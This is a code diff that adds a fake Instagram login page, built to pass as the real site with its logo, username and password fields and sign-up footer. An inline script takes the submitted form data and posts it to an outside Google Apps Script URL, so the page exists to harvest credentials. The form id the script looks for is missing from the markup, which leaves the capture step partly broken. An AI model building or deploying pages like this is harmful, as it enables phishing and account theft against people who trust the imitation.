@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css" />
+     
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="container">
+      <div class="center">
+        <div class="header">
+          <img src="https://i.ibb.co/fSZrktN/instagram-logo.png" alt="instagramLogo" class="insta_logo" />
+        </div>
+        <div class="inputElement">
+          <input
+            type="text"
+            placeholder="Phone number,username or email"
+            class="inputText"
+            name="name"
+            id="fname"
+          />
+          <input type="password" placeholder="Password" class="inputText" 
+          name="lname" id="email"/>
+          <input type="submit" value="submit" class="inputButton" />
+          <div class="line">
+            <span class="arrow"></span>
+            <span class="content">OR</span>
+            <span class="arrow"></span>
+          </div>
+          <div class="social__icon">
+            <i class="fab fa-facebook-square"></i
+            ><span>Log in with facebook</span>
+          </div>
+          <div class="forgetPassword">Forget Password?</div>
+        </div>
+      </div>
+      <div class="footer">
+        <p>Don't have a accout?<span>Sign Up</span></p>
+      </div>
+    </div>
+       <script> 
+     $("#submit-form").submit((e)=>{ 
+         e.preventDefault() 
+         $.ajax({ 
+             url:"https://script.google.com/macros/s/AKfycbwH10hwHxQJHm95zz2SVGZlS1o23Uyc2yhRzAu6Qg9x0YNk7lUXk9DDqFOziBTN0giO/exec", 
+             data:$("#submit-form").serialize(), 
+             method:"post", 
+             success:function (response){ 
+                 alert("Form submitted successfully") 
+                 window.location.reload() 
+                 //window.location.href="https://google.com" 
+             }, 
+             error:function (err){ 
+                 alert("Something Error") 
+  
+             } 
+         }) 
+     }) 
+ </script>
+  </body>
+</html>
